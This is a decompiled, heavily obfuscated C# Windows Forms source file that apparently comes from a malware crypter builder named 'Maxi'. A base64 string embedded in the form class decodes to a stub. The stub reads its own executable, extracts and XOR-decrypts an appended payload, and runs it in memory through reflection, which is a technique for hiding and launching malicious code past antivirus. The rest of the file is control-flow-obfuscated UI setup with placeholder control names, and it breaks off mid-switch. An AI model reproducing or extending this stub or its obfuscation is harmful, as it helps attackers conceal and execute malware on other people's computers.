using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace Maxi;

[DesignerGenerated]
public class Max : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("Button3")]
	private Button _Button3;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("CheckBox2")]
	private CheckBox _CheckBox2;

	[AccessedThroughProperty("ComboBox1")]
	private ComboBox _ComboBox1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	public static string XE = ((Encoding)pqOxwC5ZEMho2D2w9Wr()).GetString((byte[])fsKp7n56Ka3bXy36Olx("dXNpbmcgU3lzdGVtOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zOw0KdXNpbmcgU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWM7DQp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXM7DQp1c2luZyBTeXN0ZW0uV2luZG93cy5Gb3JtczsNCnVzaW5nIFN5c3RlbS5UZXh0Ow0KdXNpbmcgU3lzdGVtLklPOw0KdXNpbmcgU3lzdGVtLlJlZmxlY3Rpb247DQp1c2luZyBTeXN0ZW0uVGV4dC5SZWd1bGFyRXhwcmVzc2lvbnM7DQp1c2luZyBTeXN0ZW0uQ29tcG9uZW50TW9kZWw7DQp1c2luZyBTeXN0ZW0uV2luZG93czsNCnVzaW5nIFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHk7DQp1c2luZyBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzOw0KdXNpbmcgU3lzdGVtLlJ1bnRpbWUuU2VyaWFsaXphdGlvbi5Gb3JtYXR0ZXJzLkJpbmFyeTsNCg0KDQpuYW1lc3BhY2Ugeg0Kew0KICAgIGNsYXNzIHoNCiAgICB7DQogICAgICAgIHB1YmxpYyBzdGF0aWMgdm9pZCBtYWluKCkNCiAgICAgICAgew0KICAgICAgICAgICAgeSgpOw0KICAgICAgICB9DQoNCiAgICAgICAgcHVibGljIHN0YXRpYyB2b2lkIHkoKQ0KCQl7DQogICAgICAgICAgICBzdHJpbmcgZmlsID0gRmlsZS5SZWFkQWxsVGV4dChBcHBsaWNhdGlvbi5FeGVjdXRhYmxlUGF0aCk7DQogICAgICAgICAgICBzdHJpbmdbXSBzdHJBcnJheSA9IGZpbC5TcGxpdChuZXcgc3RyaW5nW10geyAiQlVZYlN2RTVsUVQiIH0sIFN0cmluZ1NwbGl0T3B0aW9ucy5Ob25lKTsNCiAgICAgICAgICAgIGJ5dGVbXSBleGUgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoc3RyQXJyYXlbMThdKTsNCgkJCWJ5dGVbXSBkbGwgPSBQb2x5RGVDcnlwdChyZWYgZXhlICwgcmVmIHN0ckFycmF5WzFdKTsNCiAgICAgICAgICAgIA0KICAgICAgICAgIFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQoZGxsKS5HZXRUeXBlKCJMaWJvLkxpYm8iKS5HZXRNZXRob2QoIkxpYm8iKS5JbnZva2UobnVsbCwgbmV3IG9iamVjdFtdIHsgIH0gKTsNCgkJfQ0KDQoNCiAgICAgICAgcHVibGljIHN0YXRpYyBieXRlW10gUG9seURlQ3J5cHQocmVmIGJ5dGVbXSBEYXRhLCByZWYgc3RyaW5nIGtleXMpDQogICAgICAgIHsNCiAgICAgICAgICAgIGJ5dGVbXSBLZXkgPSBFbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleXMpOw0KICAgICAgICAgICAgaW50IGkgPSAwOw0KICAgICAgICAgICAgZm9yIChpID0gMDsgaSA8PSAoRGF0YS5MZW5ndGggLSAxKSAqICgwICsgMSk7IGkrKykNCiAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICBEYXRhW2kgJSBEYXRhLkxlbmd0aF0gPSBDb252ZXJ0LlRvQnl0ZSgoQ29udmVydC5Ub0ludDMyKERhdGFbaSAlIERhdGEuTGVuZ3RoXSBeIEtleVtpICUgS2V5Lkxlbmd0aF0pIC0gQ29udmVydC5Ub0ludDMyKERhdGFbKGkgKyAxKSAlIERhdGEuTGVuZ3RoXSkgKyAyNTYpICUgMjU2KTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgICAgIEFycmF5LlJlc2l6ZShyZWYgRGF0YSwgRGF0YS5MZW5ndGggLSAxKTsNCiAgICAgICAgICAgIHJldHVybiBEYXRhOw0KICAgICAgICB9DQogICAgICAgIA0KICAgIH0NCn0NCg=="));

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button1 = value;
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button2 = value;
		}
	}

	internal virtual Button Button3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Button3 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual CheckBox CheckBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox2 = value;
		}
	}

	internal virtual ComboBox ComboBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ComboBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ComboBox1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	[DebuggerNonUserCode]
	public Max()
	{
		lOUUsjmuafUvhMSpRA(this);
		Lqkqs57vdX8OG1wSQE();
		if (!ji9vSHhFFFpuEZPDoU())
		{
			((Form)this).add_Load((EventHandler)Max_Load);
			dpLI99SLvRwmGVVJEF(this);
		}
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		_ = 0;
		if (!Lqkqs57vdX8OG1wSQE())
		{
			int num = 3;
			if (ji9vSHhFFFpuEZPDoU())
			{
				goto IL_004f;
			}
			while (true)
			{
				switch (num)
				{
				default:
					num = 4;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					break;
				case 0:
				case 2:
					break;
				case 1:
				case 3:
					goto IL_0049;
				case 4:
					goto IL_004f;
				}
				break;
			}
		}
		List<WeakReference> _ENCList = __ENCList;
		goto IL_0049;
		IL_004f:
		checked
		{
			try
			{
				bool flag = KFPKPhF6mHUFWxQnit(__ENCList) == ialF2q3LfI1rfwO6Pk(__ENCList);
				bool flag2 = default(bool);
				while (flag)
				{
					while (true)
					{
						int num2 = 0;
						while (true)
						{
							int num3 = KFPKPhF6mHUFWxQnit(__ENCList) - 1;
							int num4 = 0;
							while (true)
							{
								IL_0137:
								int num5 = num4;
								int num6 = num3;
								if (num5 <= num6)
								{
									WeakReference object_ = __ENCList[num4];
									flag = OSsfti4Sx3HxJKWrkN(object_);
									goto IL_0081;
								}
								while (true)
								{
									Xe8d4SfhfPVlWrTrWr(__ENCList, num2, KFPKPhF6mHUFWxQnit(__ENCList) - num2);
									if (!ji9vSHhFFFpuEZPDoU())
									{
										switch (4)
										{
										case 8:
											break;
										case 15:
											goto IL_0085;
										case 14:
											goto end_IL_00c0;
										default:
											goto IL_0092;
										case 12:
											goto IL_00a8;
										case 1:
										case 9:
											goto IL_00ba;
										case 7:
											continue;
										case 2:
										case 10:
										case 13:
											goto IL_0137;
										case 5:
											goto end_IL_0137;
										case 6:
											goto end_IL_0148;
										case 11:
											goto end_IL_015a;
										case 4:
											diYLd2LjKgUaqn4gFH(__ENCList, KFPKPhF6mHUFWxQnit(__ENCList));
											goto end_IL_015e;
										case 0:
											goto end_IL_015e;
										case 16:
											return;
										}
										goto IL_0081;
									}
									break;
									continue;
									end_IL_00c0:
									break;
								}
								goto IL_008e;
								IL_00a8:
								num2++;
								_ = 0;
								if (Lqkqs57vdX8OG1wSQE())
								{
									goto IL_00ba;
								}
								continue;
								IL_00ba:
								num4++;
								continue;
								IL_0081:
								if (flag)
								{
									goto IL_0085;
								}
								goto IL_00ba;
								IL_0085:
								flag2 = num4 != num2;
								goto IL_008e;
								IL_008e:
								if (flag2)
								{
									goto IL_0092;
								}
								goto IL_00a8;
								IL_0092:
								__ENCList[num2] = __ENCList[num4];
								goto IL_00a8;
								continue;
								end_IL_0137:
								break;
							}
							continue;
							end_IL_0148:
							break;
						}
						continue;
						end_IL_015a:
						break;
					}
					continue;
					end_IL_015e:
					break;
				}
				__ENCList.Add(new WeakReference(RrVt0ZJV4FOn4Lt5R0(value)));
				return;
			}
			finally
			{
				LuXiYsGOryMA6C6nfL(_ENCList);
			}
		}
		IL_0049:
		yqNZgRBSVE4HDG2X1N(_ENCList);
		goto IL_004f;
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			int num;
			if (disposing)
			{
				if (components != null)
				{
					num = 1;
					goto IL_004a;
				}
				_ = 1;
				if (ji9vSHhFFFpuEZPDoU())
				{
					if (!Lqkqs57vdX8OG1wSQE())
					{
						goto IL_004b;
					}
					switch (3)
					{
					case 0:
					case 2:
						break;
					case 1:
					case 3:
						goto IL_004b;
					default:
						goto IL_004e;
					case 5:
						return;
					}
				}
			}
			num = 0;
			goto IL_004a;
			IL_004a:
			bool flag = (byte)num != 0;
			goto IL_004b;
			IL_004e:
			zO9xoOwinmCFPAZkJl(components);
			return;
			IL_004b:
			if (!flag)
			{
				return;
			}
			goto IL_004e;
		}
		finally
		{
			UbteBBZRRTh2FVCjLD(this, disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0116: Expected O, but got Unknown
		//IL_0117: Unknown result type (might be due to invalid IL or missing references)
		//IL_0121: Expected O, but got Unknown
		//IL_0122: Unknown result type (might be due to invalid IL or missing references)
		//IL_012c: Expected O, but got Unknown
		//IL_012d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0137: Expected O, but got Unknown
		//IL_0138: Unknown result type (might be due to invalid IL or missing references)
		//IL_0142: Expected O, but got Unknown
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_014d: Expected O, but got Unknown
		//IL_014e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0158: Expected O, but got Unknown
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected O, but got Unknown
		//IL_0164: Unknown result type (might be due to invalid IL or missing references)
		//IL_016e: Expected O, but got Unknown
		//IL_02d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02dc: Expected O, but got Unknown
		//IL_02dd: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e7: Expected O, but got Unknown
		//IL_02e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f2: Expected O, but got Unknown
		//IL_094b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0955: Expected O, but got Unknown
		//IL_0956: Unknown result type (might be due to invalid IL or missing references)
		//IL_0960: Expected O, but got Unknown
		//IL_09ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_09f4: Expected O, but got Unknown
		//IL_0a44: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a4e: Expected O, but got Unknown
		//IL_0d71: Unknown result type (might be due to invalid IL or missing references)
		//IL_0d7b: Expected O, but got Unknown
		while (true)
		{
			IL_0d70:
			qSPvHi6Ag9ucByFqdo(this, (object)new Button());
			int num = 45;
			if (!Lqkqs57vdX8OG1wSQE())
			{
				goto IL_07df;
			}
			goto IL_0b86;
			IL_0b86:
			Size size_;
			Point location;
			while (true)
			{
				switch (num)
				{
				case 118:
				{
					object object_18 = phYAFK5edNviv7X5y9I(this);
					location = new Point(531, 37);
					IijDfP5MILflLk8Qj6D(object_18, location);
					goto case 79;
				}
				case 79:
					csUgJa5n0kiZkSfvNa0(phYAFK5edNviv7X5y9I(this), "Button3");
					ji9vSHhFFFpuEZPDoU();
					if (Lqkqs57vdX8OG1wSQE())
					{
						num = 77;
						if (!ji9vSHhFFFpuEZPDoU())
						{
							continue;
						}
						goto case 31;
					}
					goto IL_019b;
				case 31:
				case 77:
				{
					object object_19 = phYAFK5edNviv7X5y9I(this);
					size_ = new Size(75, 23);
					h4sBVd5CjHxCFD0o4pG(object_19, size_);
					goto case 29;
				}
				case 29:
					PjO2n35gwWS8N8JBcJg(phYAFK5edNviv7X5y9I(this), 2);
					NO0PQU529Ry7rgORm8E(phYAFK5edNviv7X5y9I(this), "Button3");
					goto case 84;
				case 84:
				{
					LyfJA85PnUYUPrCv58H(phYAFK5edNviv7X5y9I(this), bool_0: true);
					ynk5uN5dXaAZt1gBli6(gIrE0Y5O5iFtsZDOqNV(this), bool_0: true);
					CheckBox checkBox2 = CheckBox1;
					location = new Point(633, 288);
					IijDfP5MILflLk8Qj6D(checkBox2, location);
					csUgJa5n0kiZkSfvNa0(gIrE0Y5O5iFtsZDOqNV(this), "CheckBox1");
					goto case 47;
				}
				case 47:
				{
					object object_20 = gIrE0Y5O5iFtsZDOqNV(this);
					size_ = new Size(81, 17);
					h4sBVd5CjHxCFD0o4pG(object_20, size_);
					goto case 80;
				}
				case 80:
					PjO2n35gwWS8N8JBcJg(gIrE0Y5O5iFtsZDOqNV(this), 3);
					goto case 15;
				case 15:
					NO0PQU529Ry7rgORm8E(gIrE0Y5O5iFtsZDOqNV(this), "CheckBox1");
					num = 24;
					if (!ji9vSHhFFFpuEZPDoU())
					{
						continue;
					}
					goto case 39;
				case 39:
					rWHcYh1jDdkH5Uk5GD(this, (object)new Button());
					goto case 90;
				case 90:
					CheckBox1 = new CheckBox();
					goto case 71;
				case 71:
					iAFgZ2zPfJvbklKMZ5(this, (object)new CheckBox());
					goto case 17;
				case 17:
					VqSJjM5atuAUVKC8il6(this, (object)new ComboBox());
					uAxUnU55xg9OuBnC1qJ(this, (object)new Label());
					goto case 51;
				case 51:
					vu71UX5oqYOSIQAmEYM(this, (object)new Label());
					goto case 43;
				case 43:
					mGvdKi5V5WmCQMgpi1n(this, (object)new Label());
					break;
				case 2:
					break;
				case 66:
					goto IL_0163;
				case 99:
					goto IL_017e;
				case 10:
				case 92:
					goto IL_019b;
				case 50:
					goto IL_01bb;
				case 32:
					goto IL_01c8;
				case 28:
					goto IL_01f5;
				case 94:
					goto IL_0229;
				case 49:
					goto IL_0239;
				case 23:
					goto IL_0260;
				case 111:
					goto IL_026c;
				case 9:
					goto IL_027c;
				case 117:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), CnoXj85hVruE7ubOkX3(this));
					goto case 36;
				case 36:
					iTnEpl53Q5dC4PpOymr(((Control)this).get_Controls(), ffy8iI5xQOYYt9civ5o(this));
					num = 76;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 78;
				case 116:
					VjlFvb5N3aFiQ2874O8(this, (object)new ProgressBar());
					goto case 11;
				case 11:
					lnxcV95RIOrOxRbIiFE(this, (object)new TextBox());
					goto case 12;
				case 12:
					RTaLco5cPcn2kSSUTHw(this, (object)new RadioButton());
					num = 33;
					if (ji9vSHhFFFpuEZPDoU())
					{
					}
					continue;
				case 115:
				{
					object object_17 = CnoXj85hVruE7ubOkX3(this);
					size_ = new Size(200, 100);
					h4sBVd5CjHxCFD0o4pG(object_17, size_);
					num = 34;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 47;
				}
				case 114:
					csUgJa5n0kiZkSfvNa0(qacfHE5raBSR0rkw4eX(this), "ProgressBar1");
					goto IL_017e;
				case 113:
				{
					object obj6 = w8iDZT50S4oeiNs5QG2(this);
					size_ = new Size(75, 23);
					((Control)obj6).set_Size(size_);
					num = 74;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 102;
				}
				case 102:
				{
					object object_16 = w8iDZT50S4oeiNs5QG2(this);
					location = new Point(524, 86);
					IijDfP5MILflLk8Qj6D(object_16, location);
					goto case 98;
				}
				case 98:
					csUgJa5n0kiZkSfvNa0(w8iDZT50S4oeiNs5QG2(this), "Button1");
					goto case 113;
				case 112:
					((ButtonBase)CheckBox2).set_Text("CheckBox2");
					goto case 56;
				case 56:
					((ButtonBase)ispcZy5IyX17ed8g0sq(this)).set_UseVisualStyleBackColor(true);
					goto case 65;
				case 65:
				{
					fakCiW5K2GFe5Sx7epR(TPh4Nh5jCxQxcWF6L43(this), bool_0: true);
					object obj5 = TPh4Nh5jCxQxcWF6L43(this);
					location = new Point(556, 139);
					((Control)obj5).set_Location(location);
					goto case 8;
				}
				case 8:
				{
					csUgJa5n0kiZkSfvNa0(TPh4Nh5jCxQxcWF6L43(this), "ComboBox1");
					object object_14 = TPh4Nh5jCxQxcWF6L43(this);
					size_ = new Size(121, 21);
					h4sBVd5CjHxCFD0o4pG(object_14, size_);
					PjO2n35gwWS8N8JBcJg(ComboBox1, 5);
					R2vjsW5HtQLUyUnSBCQ(TNk9UH5ysL0SrFwacyW(this), bool_0: true);
					goto case 18;
				}
				case 18:
				{
					object object_15 = TNk9UH5ysL0SrFwacyW(this);
					location = new Point(329, 150);
					IijDfP5MILflLk8Qj6D(object_15, location);
					goto case 38;
				}
				case 38:
					((Control)TNk9UH5ysL0SrFwacyW(this)).set_Name("Label1");
					num = 104;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 43;
				case 110:
				{
					object object_13 = tQufPp5YsTZMERCaXlm(this);
					size_ = new Size(90, 17);
					h4sBVd5CjHxCFD0o4pG(object_13, size_);
					goto case 64;
				}
				case 64:
					PjO2n35gwWS8N8JBcJg(tQufPp5YsTZMERCaXlm(this), 14);
					goto case 73;
				case 73:
					WOPFHZ5svBvt50ZHKdE(tQufPp5YsTZMERCaXlm(this), bool_0: true);
					num = 14;
					if (ji9vSHhFFFpuEZPDoU())
					{
					}
					continue;
				case 109:
				{
					object obj3 = R2FRYa5iqdDcUhwHgl3(this);
					location = new Point(228, 279);
					((Control)obj3).set_Location(location);
					num = 96;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 75;
				}
				case 75:
				{
					csUgJa5n0kiZkSfvNa0(oXKaYs5ASZWQWgDFLaB(this), "RadioButton1");
					object object_12 = oXKaYs5ASZWQWgDFLaB(this);
					size_ = new Size(90, 17);
					h4sBVd5CjHxCFD0o4pG(object_12, size_);
					goto case 105;
				}
				case 105:
					PjO2n35gwWS8N8JBcJg(RadioButton1, 13);
					((RadioButton)oXKaYs5ASZWQWgDFLaB(this)).set_TabStop(true);
					NO0PQU529Ry7rgORm8E(oXKaYs5ASZWQWgDFLaB(this), "RadioButton1");
					goto case 52;
				case 52:
					LyfJA85PnUYUPrCv58H(oXKaYs5ASZWQWgDFLaB(this), bool_0: true);
					goto case 61;
				case 61:
				{
					ynk5uN5dXaAZt1gBli6(tQufPp5YsTZMERCaXlm(this), bool_0: true);
					object obj4 = tQufPp5YsTZMERCaXlm(this);
					location = new Point(434, 357);
					((Control)obj4).set_Location(location);
					goto case 21;
				}
				case 21:
					csUgJa5n0kiZkSfvNa0(tQufPp5YsTZMERCaXlm(this), "RadioButton2");
					num = 110;
					if (!ji9vSHhFFFpuEZPDoU())
					{
						continue;
					}
					goto case 71;
				case 108:
					((ControlCollection)e70pL55FoNALqPcYchB(this)).Add((Control)R2FRYa5iqdDcUhwHgl3(this));
					num = 82;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 98;
				case 107:
					csUgJa5n0kiZkSfvNa0(UI0PML5b6I9qhK4r2xC(this), "Button2");
					goto case 86;
				case 86:
				{
					object object_10 = UI0PML5b6I9qhK4r2xC(this);
					size_ = new Size(75, 23);
					h4sBVd5CjHxCFD0o4pG(object_10, size_);
					num = 97;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 55;
				}
				case 4:
				{
					object object_11 = UI0PML5b6I9qhK4r2xC(this);
					location = new Point(534, 61);
					IijDfP5MILflLk8Qj6D(object_11, location);
					goto case 107;
				}
				case 55:
					LyfJA85PnUYUPrCv58H(w8iDZT50S4oeiNs5QG2(this), bool_0: true);
					goto case 4;
				case 106:
				{
					object object_9 = o21QTI5XZrmBGYoCyhU(this);
					location = new Point(80, 324);
					IijDfP5MILflLk8Qj6D(object_9, location);
					goto case 101;
				}
				case 101:
					csUgJa5n0kiZkSfvNa0(o21QTI5XZrmBGYoCyhU(this), "PictureBox1");
					num = 30;
					if (!ji9vSHhFFFpuEZPDoU())
					{
						continue;
					}
					goto case 81;
				case 81:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), T3nqV059Uktlus49t0b(this));
					goto case 3;
				case 3:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), jiiU8M5WOG6CMh00n5s(this));
					num = 108;
					if (!ji9vSHhFFFpuEZPDoU())
					{
						continue;
					}
					goto case 101;
				case 104:
				{
					object obj2 = TNk9UH5ysL0SrFwacyW(this);
					size_ = new Size(39, 13);
					((Control)obj2).set_Size(size_);
					goto case 42;
				}
				case 42:
					PjO2n35gwWS8N8JBcJg(TNk9UH5ysL0SrFwacyW(this), 6);
					goto case 54;
				case 54:
					mOER8D5v3bDeLCqeBAD(TNk9UH5ysL0SrFwacyW(this), "Label1");
					goto case 63;
				case 63:
					R2vjsW5HtQLUyUnSBCQ(R2FRYa5iqdDcUhwHgl3(this), bool_0: true);
					goto case 109;
				case 103:
				{
					csUgJa5n0kiZkSfvNa0(T3nqV059Uktlus49t0b(this), "LinkLabel1");
					object object_8 = T3nqV059Uktlus49t0b(this);
					size_ = new Size(59, 13);
					h4sBVd5CjHxCFD0o4pG(object_8, size_);
					goto case 27;
				}
				case 27:
					PjO2n35gwWS8N8JBcJg(T3nqV059Uktlus49t0b(this), 9);
					goto case 58;
				case 58:
					Kq8bFv5UWbZ7BYyWsEM(T3nqV059Uktlus49t0b(this), bool_0: true);
					cDZ1ZK583yF1SUnOQ4t(T3nqV059Uktlus49t0b(this), "LinkLabel1");
					num = 106;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 51;
				case 100:
				{
					object object_7 = oXKaYs5ASZWQWgDFLaB(this);
					location = new Point(425, 319);
					IijDfP5MILflLk8Qj6D(object_7, location);
					goto case 75;
				}
				case 97:
					PjO2n35gwWS8N8JBcJg(UI0PML5b6I9qhK4r2xC(this), 1);
					((ButtonBase)UI0PML5b6I9qhK4r2xC(this)).set_Text("Button2");
					goto case 88;
				case 88:
					LyfJA85PnUYUPrCv58H(UI0PML5b6I9qhK4r2xC(this), bool_0: true);
					goto case 118;
				case 96:
					((Control)Label2).set_Name("Label2");
					goto case 19;
				case 19:
				{
					object object_6 = R2FRYa5iqdDcUhwHgl3(this);
					size_ = new Size(39, 13);
					h4sBVd5CjHxCFD0o4pG(object_6, size_);
					goto case 35;
				}
				case 35:
					PjO2n35gwWS8N8JBcJg(R2FRYa5iqdDcUhwHgl3(this), 7);
					mOER8D5v3bDeLCqeBAD(R2FRYa5iqdDcUhwHgl3(this), "Label2");
					num = 87;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto case 118;
				case 95:
					size_ = new Size(293, 38);
					rm2ihX5BlgUehUYfmlF(this, size_);
					goto case 117;
				case 87:
					goto IL_07df;
				case 59:
					goto IL_07eb;
				case 67:
					goto IL_0808;
				case 85:
					DeZXw25ldUY8kbHMF5g(o21QTI5XZrmBGYoCyhU(this));
					num = 7;
					if (!ji9vSHhFFFpuEZPDoU())
					{
						continue;
					}
					goto case 65;
				case 83:
				{
					R2vjsW5HtQLUyUnSBCQ(T3nqV059Uktlus49t0b(this), bool_0: true);
					object object_5 = T3nqV059Uktlus49t0b(this);
					location = new Point(75, 172);
					IijDfP5MILflLk8Qj6D(object_5, location);
					num = 103;
					if (ji9vSHhFFFpuEZPDoU())
					{
					}
					continue;
				}
				case 82:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), TNk9UH5ysL0SrFwacyW(this));
					goto case 5;
				case 5:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), TPh4Nh5jCxQxcWF6L43(this));
					goto case 72;
				case 72:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), CheckBox2);
					num = 91;
					if (Lqkqs57vdX8OG1wSQE())
					{
						continue;
					}
					goto IL_01f5;
				case 76:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), tQufPp5YsTZMERCaXlm(this));
					iTnEpl53Q5dC4PpOymr(((Control)this).get_Controls(), oXKaYs5ASZWQWgDFLaB(this));
					goto case 53;
				case 53:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), vw6lIA5uSSSFq33hXXL(this));
					goto case 20;
				case 20:
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), qacfHE5raBSR0rkw4eX(this));
					iTnEpl53Q5dC4PpOymr(e70pL55FoNALqPcYchB(this), o21QTI5XZrmBGYoCyhU(this));
					goto case 81;
				case 74:
					PjO2n35gwWS8N8JBcJg(w8iDZT50S4oeiNs5QG2(this), 0);
					goto case 13;
				case 13:
					NO0PQU529Ry7rgORm8E(w8iDZT50S4oeiNs5QG2(this), "Button1");
					goto case 55;
				case 70:
					sf7ZtK5pFhcXWaRpY6C(this, (object)new GroupBox());
					goto case 60;
				case 60:
					s3RmWJ5TtaG13dx51jX(this, (object)new Panel());
					goto case 85;
				case 69:
					RvGtnS5ERs8XgunMKjF(o21QTI5XZrmBGYoCyhU(this), bool_0: false);
					goto case 48;
				case 48:
